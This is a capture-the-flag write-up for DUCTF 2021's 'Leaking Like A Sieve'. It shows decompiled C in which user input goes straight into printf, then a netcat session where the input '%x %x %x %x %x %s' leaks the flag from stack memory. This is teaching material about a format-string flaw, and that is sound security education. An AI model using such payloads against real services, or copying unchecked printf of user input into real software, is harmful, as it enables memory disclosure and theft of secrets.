# Leaking Like A Sieve | DUCTF 2021

## Problem
This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

Author: xXl33t_h@x0rXx
nc pwn-2021.duc.tf 31918

## Solution
Decompile in Ghidra, check out the source.
```c
void main(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [32];
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  buffer_init();
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts(
        "The flag file isn\'t loading. Please contact an organiser if you are running this on theshell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_38,0x20,__stream);
  do {
    puts("What is your name?");
    fgets(local_58,0x20,stdin);
    printf("\nHello there, ");
    printf(local_58);
    putchar(10);
  } while( true );
}
```

Because there is no input validation into printf function in the loop, it is possible to leak memory and have it return to the user.  
It just takes some trial and error to find the right spot where the flag is located in memory. Addresses can be pulled from the stack with %x and read with %s.
```bash
┌──(kali㉿kali)-[]-[~/Downloads]
└─$ nc pwn-2021.duc.tf 31918

What is your name?
%x %x %x %x %x %s

Hello there, d7e422d0 a50348c0 0 e a52604c0 DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
```